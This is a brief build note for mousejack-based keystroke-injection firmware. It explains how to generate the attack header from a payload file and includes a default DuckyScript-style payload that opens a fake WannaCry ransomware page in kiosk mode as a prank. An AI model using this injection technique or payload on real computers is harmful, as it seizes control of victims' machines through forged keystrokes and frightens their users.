Copyright phikshun 2016
https://github.com/insecurityofthings/uC_mousejack

Before building the WHIDelite Firmware, be sure to modify the attack.h file using the attack_generator.py script:
python attack_generator.py PAYLOAD.txt

P.S. By default the attack.h on Github is the Fake Wannacry for windows. Is harmless. Just a joke. Don't panic :Don
GUI r
DELAY 500
STRING iexplore -k http://fakeupdate.net/wnc/
ENTER
